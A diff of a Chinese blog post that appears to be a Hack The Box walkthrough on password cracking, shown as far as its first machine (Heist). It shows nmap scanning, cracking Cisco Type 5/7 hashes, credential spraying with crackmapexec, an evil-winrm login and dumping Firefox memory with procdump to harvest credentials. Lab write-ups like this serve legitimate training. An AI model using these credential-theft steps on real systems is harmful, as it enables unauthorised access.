@@ -1,12 +1,22 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="尘埃落定">
+  <meta name="keywords" content="">
   
-  <title>WP-HTB-Password Cracking | 尘埃落定的空间站</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="这个Track是针对密码破解的练习。">
+    <meta name="description" content="这个Track是针对密码破解的练习。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WP-HTB-Password Cracking">
 <meta property="og:url" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/index.html">
@@ -61,109 +71,253 @@
 <meta property="article:author" content="尘埃落定">
 <meta property="article:tag" content="Pentest">
 <meta property="article:tag" content="HTB">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2022/11/27/WP-HTB-Password-Cracking/image-20221127125155795.png">
   
-    <link rel="alternate" href="/atom.xml" title="尘埃落定的空间站" type="application/atom+xml">
   
   
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+  <title>WP-HTB-Password Cracking - 尘埃落定的空间站</title>
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
 
   
 <meta name="generator" content="Hexo 6.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">尘埃落定的空间站</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">Stay hungry, Stay foolish.</a>
-        </h2>
-      
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>尘埃落定的空间站</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WP-HTB-Password Cracking"></span>
+          
+        </div>
+
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-27 10:49" pubdate>
+          2022年11月27日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          21k 字
         
-          <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
         
-      </nav>
-      <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+          171 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
       </div>
+
+      
     </div>
   </div>
-</header>
+</div>
 
-      <div class="outer">
-        <section id="main"><article id="post-WP-HTB-Password-Cracking" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/11/27/WP-HTB-Password-Cracking/" class="article-date">
-  <time class="dt-published" datetime="2022-11-27T02:49:34.000Z" itemprop="datePublished">2022-11-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      WP-HTB-Password Cracking
-    </h1>
-  
+</div>
 
-      </header>
+  </header>
+
+  <main>
     
-    <div class="e-content article-entry" itemprop="articleBody">
       
-	
-	  <div id="toc" class="toc-article">
-	    <strong class="toc-title">Toc</strong>
-	    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Heist"><span class="toc-number">1.</span> <span class="toc-text">Heist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS"><span class="toc-number">1.2.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0ld-is-g0ld"><span class="toc-number">2.</span> <span class="toc-text">0ld is g0ld</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup"><span class="toc-number">3.</span> <span class="toc-text">Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-1"><span class="toc-number">3.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80"><span class="toc-number">3.2.</span> <span class="toc-text">80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">3.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PATH%E5%8A%AB%E6%8C%81"><span class="toc-number">3.3.1.</span> <span class="toc-text">PATH劫持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Safe"><span class="toc-number">4.</span> <span class="toc-text">Safe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-2"><span class="toc-number">4.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1337"><span class="toc-number">4.2.</span> <span class="toc-text">1337</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-2"><span class="toc-number">4.3.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fs0ciety"><span class="toc-number">5.</span> <span class="toc-text">fs0ciety</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">5.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ellingson"><span class="toc-number">6.</span> <span class="toc-text">Ellingson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-3"><span class="toc-number">6.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">6.3.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">6.4.</span> <span class="toc-text">预期解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pwn"><span class="toc-number">6.4.1.</span> <span class="toc-text">Pwn</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
-	  </div>
-	
-        <p>这个Track是针对密码破解的练习。</p>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">WP-HTB-Password Cracking</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这个Track是针对密码破解的练习。</p>
 <span id="more"></span>
 
 <h2 id="Heist"><a href="#Heist" class="headerlink" title="Heist"></a>Heist</h2><p>一个Windows的靶机</p>
-<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/Desktop/hack-the-box]</span><br><span class="line">└─$ <span class="built_in">cat</span> nmap_scan.sh </span><br><span class="line">ip=10.10.10.149</span><br><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.149 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line"></span><br><span class="line">nmap -p<span class="variable">$ports</span> -sC -sV <span class="variable">$ip</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/Desktop/hack-the-box]<br>└─$ <span class="hljs-built_in">cat</span> nmap_scan.sh <br>ip=10.10.10.149<br>ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.149 | grep ^[0-9] | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;/&#x27;</span> -f1 | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed s/,$//)<br><br>nmap -p<span class="hljs-variable">$ports</span> -sC -sV <span class="hljs-variable">$ip</span><br><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127125155795.png" alt="image-20221127125155795"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127125155795.png" srcset="/img/loading.gif" lazyload alt="image-20221127125155795"></p>
 <h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p>登录80端口后，先使用guest账户登录</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127125827446.png" alt="image-20221127125827446"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127125827446.png" srcset="/img/loading.gif" lazyload alt="image-20221127125827446"></p>
 <p>提示<code>cisco</code>路由器存在问题，查看一下配置</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line"><span class="comment"># password </span></span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">version 12.2<br>no service pad<br>service password-encryption<br>!<br>isdn switch-type basic-5ess<br>!<br>hostname ios-1<br>!<br>security passwords min-length 12<br><span class="hljs-comment"># secret</span><br><span class="hljs-built_in">enable</span> secret 5 $1$pdQG<span class="hljs-variable">$o8nrSzsGXeaduXrjlvKc91</span><br>!<br><span class="hljs-comment"># password </span><br>username rout3r password 7 0242114B0E143F015F5D1E161713<br>username admin privilege 15 password 7 02375012182C1A1D751618034F36415408<br>!<br>!<br>ip ssh authentication-retries 5<br>ip ssh version 2<br>!<br>!<br>router bgp 100<br> synchronization<br> bgp log-neighbor-changes<br> bgp dampening<br> network 192.168.0.0Â mask 300.255.255.0<br> timers bgp 3 9<br> redistribute connected<br>!<br>ip classless<br>ip route 0.0.0.0 0.0.0.0 192.168.0.1<br>!<br>!<br>access-list 101 permit ip any any<br>dialer-list 1 protocol ip list 101<br>!<br>no ip http server<br>no ip http secure-server<br>!<br>line vty 0 4<br> session-timeout 600<br> authorization <span class="hljs-built_in">exec</span> SSH<br> transport input ssh<br><br></code></pre></td></tr></table></figure>
 <p>cisco配置文件<br><a target="_blank" rel="noopener" href="https://community.cisco.com/t5/networking-knowledge-base/understanding-the-differences-between-the-cisco-password-secret/ta-p/3163238">https://community.cisco.com/t5/networking-knowledge-base/understanding-the-differences-between-the-cisco-password-secret/ta-p/3163238</a></p>
 <blockquote>
 <p>Type 5</p>
@@ -172,100 +326,100 @@
 <p>These use the Vigenere cipher, a very simple algorithm that was cracked in 1995. These are easily reversible with tools on the internet. These should never be used and attempting to use Type 7 in modern IOS XE will throw an error as these will be depreciated soon.</p>
 </blockquote>
 <p>在线破解Type7：0242114B0E143F015F5D1E161713，<a target="_blank" rel="noopener" href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">https://www.ifm.net.nz/cookbooks/passwordcracker.html</a></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127132953334.png" alt="image-20221127132953334"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127132953334.png" srcset="/img/loading.gif" lazyload alt="image-20221127132953334"></p>
 <p>破解Type5：$1$pdQG$o8nrSzsGXeaduXrjlvKc91，在线的爆破太慢了，一直卡顿在length&#x3D;3</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127133816486.png" alt="image-20221127133816486"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127133816486.png" srcset="/img/loading.gif" lazyload alt="image-20221127133816486"></p>
 <p>使用Jonh进行爆破，字典使用：<code>rockyou.txt</code></p>
 <p><a target="_blank" rel="noopener" href="https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt">https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt</a></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127135658760.png" alt="image-20221127135658760"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127135658760.png" srcset="/img/loading.gif" lazyload alt="image-20221127135658760"></p>
 <p>可以看到爆破结果：stealth1agent</p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用<code>crackmapexec</code>对issue页面的用户admin、hazard进行smb用户枚举（445）<a target="_blank" rel="noopener" href="https://www.kali.org/tools/crackmapexec/">https://www.kali.org/tools/crackmapexec/</a></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127143320602.png" alt="image-20221127143320602"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127143320602.png" srcset="/img/loading.gif" lazyload alt="image-20221127143320602"></p>
 <p>Hazard:stealth1agent</p>
 <p>WinRM服务默认启动并监听了5985端口，尝试登入，登录失败</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/Desktop/hack-the-box]</span><br><span class="line">└─$ crackmapexec winrm 10.10.10.149 -u hazard -p stealth1agent</span><br><span class="line">SMB         10.10.10.149    5985   NONE             [*] None (name:10.10.10.149) (domain:None)</span><br><span class="line">HTTP        10.10.10.149    5985   NONE             [*] http://10.10.10.149:5985/wsman</span><br><span class="line">WINRM       10.10.10.149    5985   NONE             [-] None\hazard:stealth1agent</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/Desktop/hack-the-box]<br>└─$ crackmapexec winrm 10.10.10.149 -u hazard -p stealth1agent<br>SMB         10.10.10.149    5985   NONE             [*] None (name:10.10.10.149) (domain:None)<br>HTTP        10.10.10.149    5985   NONE             [*] http://10.10.10.149:5985/wsman<br>WINRM       10.10.10.149    5985   NONE             [-] None\hazard:stealth1agent<br></code></pre></td></tr></table></figure>
 
 <p>继续爆破rid，发现该域下有很多用户</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127145321819.png" alt="image-20221127145321819"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127145321819.png" srcset="/img/loading.gif" lazyload alt="image-20221127145321819"></p>
 <p>更新password.txt与user列表再次进行smb枚举，发现了新的组合：<code>[+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d</code></p>
 <p>使用<a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>登录WinRM，如下</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127154227092.png" alt="image-20221127154227092"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127154227092.png" srcset="/img/loading.gif" lazyload alt="image-20221127154227092"></p>
 <p>查看桌面文件</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127154452848.png" alt="image-20221127154452848"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127154452848.png" srcset="/img/loading.gif" lazyload alt="image-20221127154452848"></p>
 <p>通过检查，发现活跃的进程firefox</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; get-process -name firefox</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName</span><br><span class="line">-------  ------    -----      -----     ------     --  -- -----------</span><br><span class="line">    378      28    23012      60164       1.28   4056   1 firefox</span><br><span class="line">   1091      71   148392     225844       8.23   4288   1 firefox</span><br><span class="line">    401      34    34828      93236       1.98   5344   1 firefox</span><br><span class="line">    347      19    10224      39796       0.11   6000   1 firefox</span><br><span class="line">    355      25    16476      39124       0.16   6788   1 firefox</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; get-process -name firefox<br><br>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName<br>-------  ------    -----      -----     ------     --  -- -----------<br>    378      28    23012      60164       1.28   4056   1 firefox<br>   1091      71   148392     225844       8.23   4288   1 firefox<br>    401      34    34828      93236       1.98   5344   1 firefox<br>    347      19    10224      39796       0.11   6000   1 firefox<br>    355      25    16476      39124       0.16   6788   1 firefox<br></code></pre></td></tr></table></figure>
 
 <p>dump进程内存：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传procdump</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; upload /home/tiger/桌面/procdump.exe </span><br><span class="line">Info: Uploading /home/tiger/桌面/procdump.exe to C:\Users\Chase\Desktop\procdump.exe</span><br><span class="line"></span><br><span class="line">                                                             </span><br><span class="line">Data: 1055944 bytes of 1055944 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># dump整个内存，-ma参数</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; .\procdump.exe -accepteula -ma 4288 firefox.dmp </span><br><span class="line"></span><br><span class="line">ProcDump v11.0 - Sysinternals process dump utility</span><br><span class="line">Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span 